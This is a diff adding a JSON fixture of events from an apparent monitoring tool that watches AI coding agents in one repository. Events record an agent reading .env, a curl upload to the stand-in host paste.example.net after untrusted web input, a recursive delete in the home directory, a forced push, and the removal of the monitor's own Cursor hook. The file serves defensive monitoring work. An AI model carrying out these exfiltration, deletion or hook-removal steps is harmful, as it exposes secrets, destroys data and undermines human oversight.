@@ -1,0 +1,512 @@
+{
+  "events": [
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7Q9Y1A3C5E7G9J1K3M5N7",
+      "type": "action",
+      "occurred_at": "2026-10-23T09:15:40.777Z",
+      "device_seq": 18350,
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "dev"
+      },
+      "agent": {
+        "product": "claude_code",
+        "version": "2.1.304",
+        "session_id": "ses_01JAB7P0A2C4E6G8J0K2M4N6P8",
+        "native_session_id": "b36203ed-0765-4152-bace-3a9ee080ad41",
+        "pattern": "interactive"
+      },
+      "repo": {
+        "remote": "github.com/acme/api",
+        "branch": "main"
+      },
+      "action": {
+        "kind": "shell_exec",
+        "tool_name": "Bash",
+        "target": "go test ./...",
+        "path_class": "repo",
+        "categories": [
+          "other"
+        ],
+        "risk": "none"
+      },
+      "context": {
+        "untrusted_input_seen": false,
+        "cwd_scope": "repo"
+      },
+      "decision": {
+        "verdict": "allow",
+        "source": "auto_approve",
+        "mode": "enforce",
+        "rule_ids": [],
+        "latency_ms": 0.9
+      }
+    },
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7T3C5E7G9J1K3M5N7Q9S1",
+      "type": "action",
+      "occurred_at": "2026-10-23T09:40:00.120Z",
+      "device_seq": 18344,
+      "org_id": "org_01JA0000000000000000000001",
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+        "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+      },
+      "agent": {
+        "product": "codex_cli",
+        "version": "0.14.2",
+        "session_id": "ses_01JAB7P0A2C4E6G8J0K2M4N6P8",
+        "native_session_id": "019a1c2e-7d4b-7c10-9e2f-3a4b5c6d7e8f",
+        "pattern": "interactive"
+      },
+      "repo": {
+        "remote": "github.com/acme/api",
+        "branch": "main"
+      },
+      "action": {
+        "kind": "shell_exec",
+        "tool_name": "Bash",
+        "target": "cat .env",
+        "intent": [
+          "secret_read"
+        ],
+        "path_class": "repo",
+        "categories": [
+          "secrets"
+        ],
+        "risk": "high"
+      },
+      "context": {
+        "untrusted_input_seen": false,
+        "cwd_scope": "repo"
+      },
+      "decision": {
+        "verdict": "ask",
+        "native_verdict": "deny",
+        "source": "policy",
+        "mode": "enforce",
+        "rule_ids": [
+          "privometry/secrets:read-env-file"
+        ],
+        "latency_ms": 1.8
+      },
+      "redaction": {
+        "user.local_user": "hashed"
+      }
+    },
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7R1A3C5E7G9J1K3M5N7P9",
+      "type": "action",
+      "occurred_at": "2026-10-23T09:20:11.002Z",
+      "device_seq": 18342,
+      "org_id": "org_01JA0000000000000000000001",
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+        "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+      },
+      "agent": {
+        "product": "claude_code",
+        "version": "2.1.304",
+        "session_id": "ses_01JAB7P0A2C4E6G8J0K2M4N6P8",
+        "native_session_id": "b36203ed-0765-4152-bace-3a9ee080ad41",
+        "pattern": "interactive"
+      },
+      "repo": {
+        "remote": "github.com/acme/api",
+        "branch": "main"
+      },
+      "action": {
+        "kind": "mcp_call",
+        "tool_name": "mcp__github__create_issue",
+        "target": "{\"repo\":\"acme/api\",\"title\":\"<redacted>\"}",
+        "categories": [
+          "other"
+        ],
+        "risk": "medium"
+      },
+      "mcp": {
+        "server_id": "mcp_01J8MCPGH0000000000000000A",
+        "server_name": "github",
+        "transport": "stdio",
+        "tool": "create_issue",
+        "catalog_status": "approved",
+        "risk_score": 31
+      },
+      "context": {
+        "untrusted_input_seen": false,
+        "cwd_scope": "repo"
+      },
+      "decision": {
+        "verdict": "ask",
+        "source": "policy",
+        "mode": "enforce",
+        "rule_ids": [
+          "acme-default:ask-mcp-writes"
+        ],
+        "bundle_id": "bnd_01JAB1QZ0000000000000000AB",
+        "policy_version": 42,
+        "latency_ms": 5.4,
+        "user_response": "approved",
+        "responder": "approver"
+      },
+      "redaction": {
+        "action.target": "redacted",
+        "user.local_user": "hashed"
+      }
+    },
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7S2B4D6F8H0J2K4M6N8Q0",
+      "type": "action",
+      "occurred_at": "2026-10-23T09:31:45.900Z",
+      "device_seq": 18343,
+      "org_id": "org_01JA0000000000000000000001",
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+        "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+      },
+      "agent": {
+        "product": "cursor",
+        "version": "2.0.43",
+        "session_id": "ses_01JAB7P0A2C4E6G8J0K2M4N6P8",
+        "native_session_id": "conv_8f2a",
+        "pattern": "interactive"
+      },
+      "repo": {
+        "remote": "github.com/acme/api",
+        "branch": "main"
+      },
+      "action": {
+        "kind": "network_fetch",
+        "tool_name": "Shell",
+        "target": "curl -T <redacted_path> https://paste.example.net",
+        "intent": [
+          "network_upload"
+        ],
+        "path_class": "repo",
+        "categories": [
+          "exfiltration"
+        ],
+        "risk": "high"
+      },
+      "context": {
+        "untrusted_input_seen": true,
+        "untrusted_sources": [
+          "web_fetch"
+        ],
+        "cwd_scope": "repo"
+      },
+      "decision": {
+        "verdict": "allow",
+        "would_verdict": "deny",
+        "source": "policy",
+        "mode": "monitor",
+        "rule_ids": [
+          "privometry/exfiltration:upload-to-paste-site"
+        ],
+        "bundle_id": "bnd_01JAB1QZ0000000000000000AB",
+        "policy_version": 42,
+        "latency_ms": 2
+      },
+      "redaction": {
+        "action.target": "redacted",
+        "user.local_user": "hashed"
+      }
+    },
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7Q8XK3M2N4P5R6S7T8V9W",
+      "type": "action",
+      "occurred_at": "2026-10-23T09:14:02.481Z",
+      "device_seq": 18341,
+      "org_id": "org_01JA0000000000000000000001",
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+        "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+      },
+      "agent": {
+        "product": "claude_code",
+        "version": "2.1.304",
+        "session_id": "ses_01JAB7P0A2C4E6G8J0K2M4N6P8",
+        "native_session_id": "b36203ed-0765-4152-bace-3a9ee080ad41",
+        "pattern": "interactive"
+      },
+      "repo": {
+        "remote": "github.com/acme/api",
+        "branch": "main"
+      },
+      "action": {
+        "kind": "shell_exec",
+        "tool_name": "Bash",
+        "tool_use_id": "toolu_01AoHoixCTcgAyn3jei6Za7t",
+        "target": "rm -rf ~/<redacted_path>",
+        "intent": [
+          "recursive_delete"
+        ],
+        "path_class": "home",
+        "categories": [
+          "catastrophic"
+        ],
+        "risk": "critical"
+      },
+      "context": {
+        "untrusted_input_seen": true,
+        "untrusted_sources": [
+          "repo_file"
+        ],
+        "cwd_scope": "repo"
+      },
+      "decision": {
+        "verdict": "deny",
+        "source": "policy",
+        "mode": "enforce",
+        "rule_ids": [
+          "privometry/core-catastrophic:home-recursive-delete"
+        ],
+        "bundle_id": "bnd_01JAB1QZ0000000000000000AB",
+        "policy_version": 42,
+        "latency_ms": 3
+      },
+      "redaction": {
+        "action.target": "redacted",
+        "user.local_user": "hashed"
+      }
+    },
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7V4D6F8H0K2M4N6Q8S0T2",
+      "type": "config_change",
+      "occurred_at": "2026-10-23T08:02:17.000Z",
+      "device_seq": 18345,
+      "org_id": "org_01JA0000000000000000000001",
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+        "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+      },
+      "agent": {
+        "product": "claude_code",
+        "version": "2.1.304",
+        "session_id": "ses_01JAB7P0A2C4E6G8J0K2M4N6P8"
+      },
+      "repo": {
+        "remote": "github.com/acme/api",
+        "branch": "main"
+      },
+      "config": {
+        "change": "modified",
+        "tier": "project",
+        "path": ".claude/settings.json",
+        "path_class": "repo",
+        "holds": [
+          "hooks"
+        ],
+        "sha256_before": "sha256:1111111111111111111111111111111111111111111111111111111111111111",
+        "sha256_after": "sha256:2222222222222222222222222222222222222222222222222222222222222222",
+        "detected_by": "file_watcher"
+      },
+      "redaction": {
+        "user.local_user": "hashed"
+      }
+    },
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7X6F8H0K2M4N6Q8S0T2V4",
+      "type": "fail_mode",
+      "occurred_at": "2026-10-23T10:06:12.333Z",
+      "device_seq": 18347,
+      "org_id": "org_01JA0000000000000000000001",
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+        "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+      },
+      "agent": {
+        "product": "claude_code",
+        "version": "2.1.304",
+        "session_id": "ses_01JAB7P0A2C4E6G8J0K2M4N6P8",
+        "native_session_id": "b36203ed-0765-4152-bace-3a9ee080ad41",
+        "pattern": "interactive"
+      },
+      "repo": {
+        "remote": "github.com/acme/api",
+        "branch": "main"
+      },
+      "action": {
+        "kind": "shell_exec",
+        "tool_name": "Bash",
+        "target": "git push --force origin main",
+        "intent": [
+          "force_push"
+        ],
+        "categories": [
+          "catastrophic"
+        ],
+        "risk": "critical"
+      },
+      "fail_mode": {
+        "reason": "daemon_unavailable",
+        "category": "catastrophic",
+        "mode": "closed",
+        "evaluated_by": "hook_client",
+        "elapsed_ms": 6
+      },
+      "redaction": {
+        "user.local_user": "hashed"
+      }
+    },
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7W5E7G9J1K3M5N7Q9S1V3",
+      "type": "integrity",
+      "occurred_at": "2026-10-23T10:05:00.000Z",
+      "device_seq": 18346,
+      "org_id": "org_01JA0000000000000000000001",
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+        "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+      },
+      "integrity": {
+        "check": "hook_removed",
+        "agent_product": "cursor",
+        "tier": "user",
+        "path": "~/.cursor/hooks.json",
+        "expected_sha256": "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        "observed_sha256": "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+        "detail": "Privometry entry for beforeShellExecution is missing"
+      },
+      "redaction": {
+        "user.local_user": "hashed"
+      }
+    },
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7Z8H0K2M4N6Q8S0T2V4X6",
+      "type": "inventory",
+      "occurred_at": "2026-10-23T07:58:30.010Z",
+      "device_seq": 18349,
+      "org_id": "org_01JA0000000000000000000001",
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+        "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+      },
+      "inventory": {
+        "change": "added",
+        "item": {
+          "item_id": "mcp:claude_code:project:postgres",
+          "kind": "mcp_server",
+          "agent_product": "claude_code",
+          "name": "postgres",
+          "version": "0.6.2",
+          "tier": "project",
+          "path_class": "repo",
+          "mcp_transport": "stdio"
+        }
+      },
+      "redaction": {
+        "user.local_user": "hashed"
+      }
+    },
+    {
+      "schema": "privometry.event/v1",
+      "event_id": "evt_01JAB7Y7G9J1K3M5N7Q9S1V3X5",
+      "type": "inventory",
+      "occurred_at": "2026-10-23T07:58:30.000Z",
+      "device_seq": 18348,
+      "org_id": "org_01JA0000000000000000000001",
+      "device": {
+        "device_id": "dev_01J9ZZK2M4N6P8Q0R2S4T6V8W0",
+        "os": "macos",
+        "os_version": "15.4",
+        "arch": "arm64",
+        "sensor_version": "0.4.2"
+      },
+      "user": {
+        "local_user": "sha256:9f2c4e1a7b3d5f6081a2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718",
+        "user_id": "usr_01J9ZY1M3K5N7Q9S1V3X5Z7B9D"
+      },
+      "inventory": {
+        "change": "added",
+        "item": {
+          "item_id": "posture:cursor:user:auto_approve_mode",
+          "kind": "posture_issue",
+          "agent_product": "cursor",
+          "name": "auto_approve_mode",
+          "tier": "user",
+          "path_class": "home",
+          "posture": {
+            "check_id": "auto_approve_mode",
+            "severity": "high",
+            "message": "Cursor runs terminal commands without asking"
+          }
+        }
+      },
+      "redaction": {
+        "user.local_user": "hashed"
+      }
+    }
+  ]
+}
